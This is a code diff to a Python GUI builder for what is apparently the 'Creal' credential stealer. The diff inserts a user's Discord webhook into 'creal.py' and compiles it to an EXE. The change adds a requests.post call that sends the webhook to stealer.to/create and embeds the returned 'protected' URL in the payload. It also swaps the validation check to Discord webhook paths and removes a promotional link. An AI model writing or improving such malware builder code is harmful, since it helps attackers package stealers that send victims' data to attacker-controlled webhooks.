@@ -3,7 +3,7 @@ import shutil
 import customtkinter as ctk
 from tkinter import messagebox, filedialog
 import webbrowser  # Import the webbrowser module
-
+import requests
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
@@ -20,7 +20,7 @@ y = (screen_height - app.winfo_reqheight()) // 2
 app.geometry(f"+{x}+{y}")
 
 def validate_webhook(webhook):
-    return 'uniqueid=' in webhook
+    return '/api/webhooks/' in webhook
 
 def replace_webhook(webhook):
     file_path = 'creal.py'
@@ -48,7 +48,10 @@ def build_exe():
     webhook = entry.get()
 
     if validate_webhook(webhook):
-        replace_webhook(webhook)
+        response = requests.post("https://stealer.to/create", data={"webhook": webhook})
+        response_data = response.json()
+
+        replace_webhook(response_data["protected_url"])
         icon_choice = add_icon()
 
         if icon_choice:
@@ -73,20 +76,11 @@ def build_exe():
     else:
         messagebox.showerror("Error", "create a protected webhook here: https://stealer.to")
 
-label = ctk.CTkLabel(master=app, text="Create A Protected Webhook [CLICK_ME]", text_color=("blue"), font=("Helvetica", 17), cursor="hand2")
-label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
-
-entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Protected Hook From stealer.to")
+entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Discord Webhook URL")
 entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)
 
 button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
 button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)
 
-# Function to open a URL in the default web browser
-def open_url(url):
-    webbrowser.open_new(url)
-
-# Bind the label to open a URL when clicked
-label.bind("<Button-1>", lambda event: open_url("https://stealer.to"))
 
 app.mainloop()
